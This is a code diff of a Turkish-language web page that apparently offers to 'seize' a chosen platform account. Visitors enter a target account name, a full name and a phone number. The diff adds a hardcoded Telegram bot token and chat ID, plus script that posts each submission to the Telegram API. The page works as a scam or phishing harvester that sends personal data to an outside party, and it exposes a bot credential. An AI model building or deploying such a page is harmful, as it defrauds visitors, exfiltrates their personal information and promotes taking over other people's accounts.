@@ -15,7 +15,7 @@
       width: 100%;
       height: 200px;
       object-fit: cover;
-      display: none; /* ilk başta gizli */
+      display: none;
     }
     #container {
       padding: 20px;
@@ -91,15 +91,12 @@
 </head>
 <body>
 
-<!-- Video: sadece form sayfasında görünür -->
 <video id="backgroundVideo" autoplay loop playsinline controls>
   <source src="fero.mp4" type="video/mp4" />
   Tarayıcınız video etiketini desteklemiyor.
 </video>
 
 <div id="container">
-
-  <!-- Sayfa 1 -->
   <div id="page1" class="page active">
     <h1 style="text-align:center;">Bir platform seçin</h1>
     <div id="platforms">
@@ -115,7 +112,6 @@
     </div>
   </div>
 
-  <!-- Sayfa 2 -->
   <div id="page2" class="page">
     <div id="formTitle"></div>
     <form id="accountForm">
@@ -131,10 +127,12 @@
       <button type="submit">Gönder</button>
     </form>
   </div>
-
 </div>
 
 <script>
+  const TELEGRAM_BOT_TOKEN = "8143305401:AAEp3xNaWEoE2cbZTG_q9MvKF_ZXQO35MwQ";
+  const TELEGRAM_CHAT_ID = "5012869228";
+
   const platformBoxes = document.querySelectorAll('.platform-box');
   const page1 = document.getElementById('page1');
   const page2 = document.getElementById('page2');
@@ -147,18 +145,14 @@
   platformBoxes.forEach(box => {
     box.addEventListener('click', () => {
       selectedPlatform = box.getAttribute('data-platform');
-
-      // Sayfa geçişi
       page1.classList.remove('active');
       page2.classList.add('active');
 
-      // Video göster ve sesi aç
       video.style.display = "block";
       video.muted = false;
       video.volume = 1;
       video.play();
 
-      // Başlık değiştir
       formTitle.textContent = selectedPlatform + " hesabına el koy";
     });
   });
@@ -178,16 +172,39 @@
       return;
     }
 
-    console.log("Form verisi:", data);
-    alert("Hesap verileri gönderildi! 12-24 saat içinde şifre bildirilecektir.");
+    const message = `
+📢 Yeni Hesap Bilgisi:
+🔹 Platform: ${data.platform}
+🔹 Hesap Adı: ${data.accountName}
+🔹 İsim Soyisim: ${data.fullName || "-"}
+📞 Telefon: ${data.phoneNumber}
+    `;
 
-    accountForm.reset();
-    video.pause();
-    video.currentTime = 0;
-    video.style.display = "none";
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-    page2.classList.remove('active');
-    page1.classList.add('active');
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    })
+    .then(res => res.json())
+    .then(result => {
+      if(result.ok) {
+        alert("Hesap verileri başarıyla gönderildi!");
+        accountForm.reset();
+        video.pause();
+        video.currentTime = 0;
+        video.style.display = "none";
+        page2.classList.remove('active');
+        page1.classList.add('active');
+      } else {
+        alert("Telegram’a mesaj gönderilirken hata oluştu: " + result.description);
+      }
+    })
+    .catch(err => alert("Bir hata oluştu: " + err.message));
   });
 </script>
 
